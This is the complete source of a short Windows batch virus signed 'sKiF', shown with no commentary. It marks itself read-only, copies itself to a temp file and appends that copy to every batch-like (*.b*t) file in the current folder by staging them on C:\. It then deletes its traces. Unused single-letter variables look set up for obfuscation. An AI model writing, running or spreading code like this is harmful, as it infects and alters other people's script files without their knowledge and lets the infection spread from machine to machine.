   ::sKiF by sKiF :)
   @echo off
   set ac=c
   set ad=d
   set ae=e
   set af=f
   set ag=t
   set ah=o
   set ai=r
   set aj=p
   set ak=y
   set al=i
   set ao=a
   set am=n
   set ru=l
   set a=%%a
   set te=:
   attrib %0 +r
   for %%a in (*.b*t) do copy %%a c:\
   copy %0 Danger.tmp
   for %%a in (*.b*t) do type Danger.tmp>>c:\%%a
   for %%a in (*.b*t) do copy c:\%%a %%a
   for %%a in (*.b*t) do attrib +r
   for %%a in (*.b*t) do Del c:\%%a
   del Danger.tmp /q /f
